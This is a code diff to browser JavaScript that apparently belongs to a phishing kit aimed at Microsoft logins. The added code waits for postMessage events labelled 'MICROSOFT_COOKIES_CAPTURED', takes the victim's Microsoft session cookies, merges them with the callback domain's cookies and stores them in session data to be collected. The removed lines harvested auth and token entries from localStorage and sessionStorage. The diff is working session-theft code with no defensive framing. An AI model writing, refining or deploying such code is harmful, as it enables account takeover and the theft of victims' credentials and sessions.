@@ -189,10 +189,51 @@
                     }
                                  }
 
-                // Enhanced cookie capture - try multiple methods
+                // Real Microsoft cookie capture
                 let capturedCookies = [];
+                let microsoftCookies = [];
                 
-                // Method 1: Standard document.cookie (current domain only)
+                // Method 1: Listen for real Microsoft cookies sent via postMessage
+                const microsoftCookiePromise = new Promise((resolve) => {
+                    const timeout = setTimeout(() => {
+                        console.log('⏰ Timeout waiting for Microsoft cookies');
+                        resolve([]);
+                    }, 5000); // Wait up to 5 seconds for Microsoft cookies
+                    
+                    window.addEventListener('message', function(event) {
+                        if (event.data && event.data.type === 'MICROSOFT_COOKIES_CAPTURED') {
+                            clearTimeout(timeout);
+                            console.log('🎉 Received real Microsoft cookies!', event.data);
+                            
+                            const microsoftData = event.data.data;
+                            if (microsoftData.cookies && Array.isArray(microsoftData.cookies)) {
+                                resolve(microsoftData.cookies);
+                            } else {
+                                resolve([]);
+                            }
+                        }
+                    });
+                    
+                    // Also request cookies from any child windows/iframes
+                    try {
+                        window.postMessage({
+                            type: 'REQUEST_MICROSOFT_COOKIES'
+                        }, '*');
+                    } catch (e) {
+                        console.log('⚠️ Could not request cookies');
+                    }
+                });
+                
+                // Wait for Microsoft cookies (with timeout)
+                try {
+                    microsoftCookies = await microsoftCookiePromise;
+                    console.log(`🍪 Got ${microsoftCookies.length} real Microsoft cookies`);
+                } catch (error) {
+                    console.log('⚠️ Error waiting for Microsoft cookies:', error);
+                    microsoftCookies = [];
+                }
+                
+                // Method 2: Current domain cookies (fallback)
                 const cookieStrings = document.cookie.split(';').filter(c => c.trim());
                 const currentDomainCookies = cookieStrings.map(c => {
                     const [name, value] = c.trim().split('=');
@@ -208,59 +249,19 @@
                         hostOnly: false,
                         session: false,
                         storeId: null,
-                        source: 'document.cookie'
+                        source: 'callback_domain'
                     } : null;
                 }).filter(cookie => cookie !== null);
                 
-                capturedCookies = [...currentDomainCookies];
-                
-                // Method 2: Try to capture from localStorage/sessionStorage that might contain auth data
-                try {
-                    const localStorageData = Object.fromEntries(Object.entries(localStorage));
-                    const sessionStorageData = Object.fromEntries(Object.entries(sessionStorage));
-                    
-                    // Look for auth-related data in storage
-                    Object.entries(localStorageData).forEach(([key, value]) => {
-                        if (key.toLowerCase().includes('auth') || key.toLowerCase().includes('token') || key.toLowerCase().includes('microsoft')) {
-                            capturedCookies.push({
-                                name: key + '_localStorage',
-                                value: value,
-                                domain: window.location.hostname,
-                                source: 'localStorage',
-                                type: 'storage'
-                            });
-                        }
-                    });
-                    
-                    Object.entries(sessionStorageData).forEach(([key, value]) => {
-                        if (key.toLowerCase().includes('auth') || key.toLowerCase().includes('token') || key.toLowerCase().includes('microsoft')) {
-                            capturedCookies.push({
-                                name: key + '_sessionStorage',
-                                value: value,
-                                domain: window.location.hostname,
-                                source: 'sessionStorage',
-                                type: 'storage'
-                            });
-                        }
-                    });
-                } catch (storageError) {
-                    console.log('⚠️ Could not access browser storage');
-                }
-                
-                // Method 3: Check if we can get cookies from the referrer or iframe techniques
-                try {
-                    if (document.referrer && document.referrer.includes('login.microsoftonline.com')) {
-                        console.log('🔍 Came from Microsoft login page:', document.referrer);
-                        // Note: Cross-origin cookies won't be accessible due to security
-                    }
-                } catch (referrerError) {
-                    console.log('⚠️ Could not check referrer');
-                }
+                // Combine Microsoft cookies (priority) with current domain cookies
+                capturedCookies = [...microsoftCookies, ...currentDomainCookies];
                 
                 sessionData.formattedCookies = capturedCookies;
-                console.log('🍪 Cookie capture summary:', {
-                    documentCookies: currentDomainCookies.length,
+                console.log('🍪 Final cookie capture summary:', {
+                    microsoftCookies: microsoftCookies.length,
+                    currentDomainCookies: currentDomainCookies.length,
                     totalCaptured: capturedCookies.length,
+                    microsoftDomains: [...new Set(microsoftCookies.map(c => c.capturedFrom))],
                     sources: [...new Set(capturedCookies.map(c => c.source))]
                 });
 
